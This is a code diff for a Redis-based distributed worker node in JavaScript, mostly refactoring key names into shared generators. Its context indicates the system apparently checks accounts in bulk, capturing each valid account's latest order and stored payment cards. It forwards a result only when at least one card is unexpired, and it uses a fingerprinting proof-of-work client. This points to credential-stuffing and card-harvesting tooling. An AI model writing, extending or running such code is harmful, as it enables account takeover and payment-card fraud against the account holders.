@@ -21,12 +21,15 @@ const {
   closeStore,
 } = require('../shared/batch/processedStore');
 const powServiceClient = require('../shared/fingerprinting/powServiceClient');
+const { validateCaptureForForwarding } = require('../shared/capture/validateCaptureForForwarding');
 const { 
   JOB_QUEUE, 
   TASK_LEASE, 
   RESULT_CACHE, 
   PROGRESS_TRACKER,
   WORKER_HEARTBEAT,
+  WORKER_INFO,
+  BATCH_CANCELLED,
   PUBSUB_CHANNELS,
   generateWorkerId 
 } = require('../shared/redis/keys');
@@ -86,7 +89,9 @@ class WorkerNode {
     // Timeouts and intervals
     this.taskTimeout = options.taskTimeout || 120000; // 2 minutes max per task
     this.heartbeatInterval = options.heartbeatInterval || 10000; // 10 seconds
-    this.queueTimeout = options.queueTimeout || 5000; // 5 seconds BLPOP timeout (reduced for faster task pickup)
+    // BLPOP timeout — reduced from 30s to 5s for faster task pickup.
+    // Env: WORKER_QUEUE_TIMEOUT (default 30000ms), code default 5000ms.
+    this.queueTimeout = options.queueTimeout || 5000;
     
     // Intervals
     this.heartbeatTimer = null;
@@ -257,10 +262,10 @@ class WorkerNode {
         version: process.env.npm_package_version || '1.0.0'
       };
       
-      // Store worker registration (no TTL - cleaned up on shutdown)
+      // Store worker registration (no TTL — cleaned up on shutdown)
       await this.redis.executeCommand(
         'set',
-        `worker:${this.workerId}:info`,
+        WORKER_INFO.generate(this.workerId),
         JSON.stringify(registrationData)
       );
       
@@ -892,42 +897,6 @@ class WorkerNode {
   }
 
   /**
-   * Validate capture data against channel-forward guard requirements.
-   * Requirements: latestOrder !== 'n/a' and at least one unexpired card.
-   * @param {Object|null} capture
-   * @returns {{valid: boolean, reason: string}}
-   */
-  validateCaptureForForwarding(capture) {
-    if (!capture) {
-      return { valid: false, reason: 'no capture data' };
-    }
-
-    if (!capture.latestOrder || capture.latestOrder === 'n/a') {
-      return { valid: false, reason: 'no latest order' };
-    }
-
-    if (!capture.profile || !Array.isArray(capture.profile.cards) || capture.profile.cards.length === 0) {
-      return { valid: false, reason: 'no cards captured' };
-    }
-
-    const hasUnexpiredCard = capture.profile.cards.some((card) => {
-      if (!card || !card.expiry) return false;
-      const [mm, yy] = String(card.expiry).split(/[\/\-]/);
-      const month = Number(mm);
-      const year = yy ? Number(yy.length === 2 ? `20${yy}` : yy) : NaN;
-      if (!month || month < 1 || month > 12 || !year) return false;
-      const expiryDate = new Date(year, month, 0);
-      return expiryDate >= new Date();
-    });
-
-    if (!hasUnexpiredCard) {
-      return { valid: false, reason: 'all cards expired or missing expiry' };
-    }
-
-    return { valid: true, reason: '' };
-  }
-
-  /**
    * Publish result events to Redis pub/sub for coordinator
    * @param {Object} result - Result object
    * @param {Object} checkResult - Original check result
@@ -936,7 +905,7 @@ class WorkerNode {
     try {
       // Publish forward_event only when capture passes the forwarding guard.
       if (result.status === 'VALID') {
-        const validation = this.validateCaptureForForwarding(result.capture || null);
+        const validation = validateCaptureForForwarding(result.capture || null);
         if (!validation.valid) {
           log.debug('Skipping forward_event publish: capture does not meet forwarding guard', {
             workerId: this.workerId,
@@ -1040,7 +1009,7 @@ class WorkerNode {
    */
   async isBatchCancelled(batchId) {
     try {
-      const cancelKey = `batch:${batchId}:cancelled`;
+      const cancelKey = BATCH_CANCELLED.generate(batchId);
       const result = await this.redis.executeCommand('get', cancelKey);
       return result !== null;
     } catch (error) {
@@ -1248,7 +1217,7 @@ class WorkerNode {
     
     // Clean up worker registration
     try {
-      await this.redis.executeCommand('del', `worker:${this.workerId}:info`);
+      await this.redis.executeCommand('del', WORKER_INFO.generate(this.workerId));
       await this.redis.executeCommand('del', WORKER_HEARTBEAT.generate(this.workerId));
       
       log.debug(`Cleaned up worker registration for ${this.workerId}`);
